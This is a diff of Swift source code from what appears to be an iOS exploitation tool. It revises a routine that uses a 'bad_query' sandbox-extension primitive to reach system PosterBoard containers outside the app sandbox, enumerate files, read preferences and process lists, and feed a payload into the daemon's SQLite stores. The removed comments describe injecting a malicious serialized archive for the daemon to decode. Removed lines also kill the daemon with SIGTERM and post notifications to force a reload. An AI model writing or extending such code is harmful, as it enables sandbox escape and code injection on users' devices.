@@ -1098,116 +1098,92 @@ class SymHandler {
         0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x5b
     ])
 
-    /// Maps posterboardd's on-disk storage via bad_query, reads SQLite schemas,
-    /// extracts binary strings, and (if a suitable blob column is found) injects
-    /// the malicious NSKeyedArchive payload for posterboardd to decode on restart.
-    /// Saves full output to pp_posterboardd_diag.txt in LC Documents.
+    /// Probe v2: focuses on what bad_query CAN reach.
+    /// - PosterBoard app container SQLite (PRBPosterExtensionDataStoreSQLiteDatabase)
+    /// - App group containers for posterboard identifiers
+    /// - Full directory tree of PosterBoard container
+    /// Saves to pp_posterboardd_diag.txt in LC Documents.
     @discardableResult
     static func probePosterboardd() -> String {
-        var diag: [String] = ["=== PosterboarddProbe \(Date()) iOS 26.5 ==="]
+        var diag: [String] = ["=== PosterboarddProbe v2 \(Date()) iOS 26.5 ==="]
         let fm = FileManager.default
         let payload = posterboarddPayloadBase
 
-        // [0] bad_query sanity check
-        diag.append("[0] bad_query: \(BadQuery.isAvailable ? "AVAILABLE" : "FAIL – aborting")")
+        // [0] bad_query check
+        diag.append("[0] bad_query: \(BadQuery.isAvailable ? "AVAILABLE" : "FAIL")")
         guard BadQuery.isAvailable else {
-            let out = diag.joined(separator: "\n")
-            try? out.write(to: getLCDocumentsDirectory().appendingPathComponent("pp_posterboardd_diag.txt"), atomically: true, encoding: .utf8)
-            return out
+            return pbSave(diag)
         }
 
-        // [1] Enumerate /var/mobile/Library/ for poster/wallpaper/springboard dirs
-        diag.append("\n[1] /var/mobile/Library scan:")
-        if let h = try? BadQuery.consume(path: "/var/mobile/Library", create: true) {
-            defer { h.release() }
-            let items = (try? fm.contentsOfDirectory(atPath: "/var/mobile/Library")) ?? []
-            let interesting = items.filter {
-                let l = $0.lowercased()
-                return l.contains("poster") || l.contains("wallpaper") || l.contains("springboard")
-            }
-            diag.append("  found \(interesting.count) dirs: \(interesting.joined(separator: ", "))")
-            for item in interesting {
-                pbEnumDir("/var/mobile/Library/\(item)", depth: 0, maxDepth: 3, fm: fm, diag: &diag)
-            }
-        } else {
-            diag.append("  CONSUME FAIL on /var/mobile/Library")
+        // [1] PosterBoard app container — full tree + every SQLite
+        diag.append("\n[1] PosterBoard app container:")
+        let pbHashUUID: String? = try? BadQuery.findPosterBoardHash()
+        diag.append("  hash: \(pbHashUUID ?? "NOT FOUND")")
+        if let uuid = pbHashUUID {
+            let fullContainer = BadQuery.applicationContainerPath(appHash: uuid)
+            let dataStoreBase = fullContainer + "/Library/Application Support/PRBPosterExtensionDataStore"
+            diag.append("  container: \(fullContainer)")
+            pbEnumDir(dataStoreBase, depth: 0, maxDepth: 5, fm: fm, diag: &diag)
+
+            // Find all SQLite files anywhere under the container
+            diag.append("  --- SQLite files in container ---")
+            pbFindAndProbeSQLite(under: fullContainer, fm: fm, payload: payload, diag: &diag)
         }
 
-        // [2] Direct probe of known daemon storage paths (posterboardd is NOT an app container)
-        diag.append("\n[2] Daemon path probe:")
-        let daemonCandidates = [
-            "/var/mobile/Library/PosterBoard",
-            "/var/mobile/Library/posterboardd",
-            "/var/mobile/Library/com.apple.posterboardservices",
-            "/var/mobile/Library/com.apple.PosterBoardServices",
-            "/private/var/mobile/Library/PosterBoard",
-            "/var/db/posterboardd",
+        // [2] App group containers — posterboard-related identifiers
+        diag.append("\n[2] App group container probe:")
+        let groupIds = [
+            "group.com.apple.posterboard",
+            "group.com.apple.PosterBoard",
+            "group.com.apple.posterboardservices",
+            "group.com.apple.PosterBoardServices",
+            "com.apple.posterboard",
+            "com.apple.PosterBoard",
+            "com.apple.posterboardservices",
         ]
-        for path in daemonCandidates {
-            guard let h = try? BadQuery.consume(path: path, create: true) else {
-                diag.append("  [NOACCESS] \(path)"); continue
-            }
-            defer { h.release() }
-            var isDir: ObjCBool = false
-            guard fm.fileExists(atPath: path, isDirectory: &isDir) else {
-                diag.append("  [MISSING]  \(path) (extension issued but path doesn't exist)"); continue
-            }
-            diag.append("  [OK] \(path)")
-            if isDir.boolValue {
-                pbEnumDir(path, depth: 0, maxDepth: 3, fm: fm, diag: &diag)
+        for gid in groupIds {
+            // bad_query with group identifier — needs a valid absolute path as anchor
+            if let h = try? BadQuery.consume(path: "/var/mobile/Containers/Shared/AppGroup",
+                                              groupIdentifier: gid, isGroup: true) {
+                defer { h.release() }
+                diag.append("  [GROUP OK] \(gid)")
+                pbEnumGroupContainer(groupId: gid, fm: fm, payload: payload, diag: &diag)
+            } else {
+                diag.append("  [GROUP FAIL] \(gid)")
             }
         }
 
-        // [3] SQLite schema probe — try every .sqlite in found dirs + known names
-        diag.append("\n[3] SQLite probe:")
-        var sqlitePaths: [String] = []
-        // Any .sqlite3/.sqlite found by enumerating above paths
-        for base in ["/var/mobile/Library/PosterBoard", "/var/mobile/Library/posterboardd",
-                     "/var/mobile/Library/com.apple.posterboardservices"] {
-            if let h = try? BadQuery.consume(path: base, create: true) {
+        // [3] Preferences in PosterBoard container
+        diag.append("\n[3] PosterBoard container prefs:")
+        if let uuid = pbHashUUID {
+            let fullContainer = BadQuery.applicationContainerPath(appHash: uuid)
+            let prefPaths = [
+                fullContainer + "/Library/Preferences/com.apple.PosterBoard.plist",
+                fullContainer + "/Library/Preferences/com.apple.posterboardd.plist",
+                fullContainer + "/Library/Preferences",
+            ]
+            for p in prefPaths {
+                guard let h = try? BadQuery.consume(path: p, create: true) else {
+                    diag.append("  \(p): NOACCESS"); continue
+                }
                 defer { h.release() }
-                let items = (try? fm.contentsOfDirectory(atPath: base)) ?? []
-                for item in items where item.hasSuffix(".sqlite") || item.hasSuffix(".sqlite3") || item.hasSuffix(".db") {
-                    sqlitePaths.append("\(base)/\(item)")
+                var isDir: ObjCBool = false
+                if fm.fileExists(atPath: p, isDirectory: &isDir), isDir.boolValue {
+                    let items = (try? fm.contentsOfDirectory(atPath: p)) ?? []
+                    diag.append("  \(p)/: \(items.joined(separator: ", "))")
+                } else if let data = fm.contents(atPath: p),
+                          let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) {
+                    diag.append("  \(p): \(String(describing: pl).prefix(600))")
+                } else {
+                    diag.append("  \(p): not found or unreadable")
                 }
             }
-        }
-        // Append known candidates not already covered
-        let knownSQL = [
-            "/var/mobile/Library/PosterBoard/com.apple.posterboard.sqlite",
-            "/var/mobile/Library/PosterBoard/PosterBoard.sqlite",
-            "/var/mobile/Library/PosterBoard/posterboardd.sqlite",
-        ]
-        for p in knownSQL where !sqlitePaths.contains(p) { sqlitePaths.append(p) }
-
-        for sqlPath in sqlitePaths {
-            pbProbeSQLite(path: sqlPath, payload: payload, fm: fm, diag: &diag)
+        } else {
+            diag.append("  no hash — skipped")
         }
 
-        // [4] posterboardd binary strings (decode/import/archive/sqlite/notify/xpc)
-        diag.append("\n[4] posterboardd binary:")
-        pbReadBinaryStrings(fm: fm, diag: &diag)
-
-        // [5] SpringBoard entitlements plist (if accessible)
-        diag.append("\n[5] SpringBoard prefs/entitlements:")
-        for p in ["/var/mobile/Library/Preferences/com.apple.springboard.plist"] {
-            guard let h = try? BadQuery.consume(path: p, create: true) else {
-                diag.append("  \(p): CONSUME FAIL"); continue
-            }
-            defer { h.release() }
-            if let data = fm.contents(atPath: p),
-               let pl = try? PropertyListSerialization.propertyList(from: data, options: [], format: nil) {
-                let desc = String(describing: pl).prefix(800)
-                diag.append("  \(p): \(desc)")
-            } else {
-                diag.append("  \(p): read ok but empty/unreadable plist")
-            }
-        }
-
-        // [6] Darwin notification names in posterboardd binary (for triggering reload)
-        // (already covered in [4] — explicitly filter com.apple.* strings here)
-        diag.append("\n[6] Kill posterboardd (SIGTERM) and Darwin notifs:")
-        var pbdPid: pid_t = -1
+        // [4] Process list — find posterboardd + SpringBoard PIDs
+        diag.append("\n[4] Process list:")
         var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
         var procSize = 0
         sysctl(&mib, u_int(mib.count), nil, &procSize, nil, 0)
@@ -1219,38 +1195,60 @@ class SymHandler {
                 let name = withUnsafePointer(to: p.kp_proc.p_comm) {
                     String(cString: UnsafeRawPointer($0).assumingMemoryBound(to: CChar.self))
                 }
-                if name == "posterboardd" || name.hasPrefix("posterboard") {
-                    pbdPid = p.kp_proc.p_pid
-                    diag.append("  posterboardd pid=\(pbdPid) name=\(name)")
-                    break
+                if name.contains("poster") || name.contains("SpringBoard") || name.contains("backboard") {
+                    diag.append("  pid=\(p.kp_proc.p_pid) \(name)")
                 }
             }
         }
-        if pbdPid > 0 {
-            let r = Darwin.kill(pbdPid, SIGTERM)
-            diag.append("  SIGTERM rc=\(r) errno=\(Darwin.errno)")
-        } else {
-            diag.append("  posterboardd process not found in process list")
-        }
 
-        let center = CFNotificationCenterGetDarwinNotifyCenter()
-        let notifNames = [
-            "com.apple.springboard.posterboard.wallpapersDidChange",
-            "com.apple.posterboard.newPosterAvailable",
-            "com.apple.posterboardd.posterDataChanged",
-            "com.apple.posterboard.reload",
-            "PRBPosterExtensionDataStoreChanged",
-        ]
-        for n in notifNames {
-            CFNotificationCenterPostNotification(center, CFNotificationName(n as CFString), nil, nil, true)
-        }
-        diag.append("  posted \(notifNames.count) Darwin notif candidates")
+        return pbSave(diag)
+    }
 
+    private static func pbSave(_ diag: [String]) -> String {
         let out = diag.joined(separator: "\n")
         let diagURL = getLCDocumentsDirectory().appendingPathComponent("pp_posterboardd_diag.txt")
         try? out.write(to: diagURL, atomically: true, encoding: .utf8)
-        print("[PosterboarddProbe] saved → \(diagURL.path)")
         return out
+    }
+
+    private static func pbFindAndProbeSQLite(under base: String, fm: FileManager,
+                                              payload: Data, diag: inout [String]) {
+        guard let h = try? BadQuery.consume(path: base, create: true) else { return }
+        defer { h.release() }
+        guard let items = try? fm.contentsOfDirectory(atPath: base) else { return }
+        for item in items {
+            let sub = "\(base)/\(item)"
+            var isDir: ObjCBool = false
+            fm.fileExists(atPath: sub, isDirectory: &isDir)
+            if isDir.boolValue {
+                pbFindAndProbeSQLite(under: sub, fm: fm, payload: payload, diag: &diag)
+            } else if item.hasSuffix(".sqlite") || item.hasSuffix(".sqlite3") || item.hasSuffix(".db") {
+                pbProbeSQLite(path: sub, payload: payload, fm: fm, diag: &diag)
+            }
+        }
+    }
+
+    private static func pbEnumGroupContainer(groupId: String, fm: FileManager,
+                                              payload: Data, diag: inout [String]) {
+        // Scan /var/mobile/Containers/Shared/AppGroup/ for a container matching this group
+        let sharedBase = "/var/mobile/Containers/Shared/AppGroup"
+        guard let h = try? BadQuery.consume(path: sharedBase, groupIdentifier: groupId, isGroup: true) else { return }
+        defer { h.release() }
+        guard let uuids = try? fm.contentsOfDirectory(atPath: sharedBase) else {
+            diag.append("    cannot list \(sharedBase)"); return
+        }
+        for uuid in uuids {
+            let containerPath = "\(sharedBase)/\(uuid)"
+            let metaPath = "\(containerPath)/.com.apple.mobile_container_manager.metadata.plist"
+            if let metaData = fm.contents(atPath: metaPath),
+               let meta = try? PropertyListSerialization.propertyList(from: metaData, options: [], format: nil) as? [String: Any],
+               let id = meta["MCMMetadataIdentifier"] as? String,
+               id.lowercased().contains("poster") || id.lowercased().contains("posterboard") {
+                diag.append("    container=\(uuid) id=\(id)")
+                pbEnumDir(containerPath, depth: 0, maxDepth: 4, fm: fm, diag: &diag)
+                pbFindAndProbeSQLite(under: containerPath, fm: fm, payload: payload, diag: &diag)
+            }
+        }
     }
 
     // MARK: - Probe helpers (private)
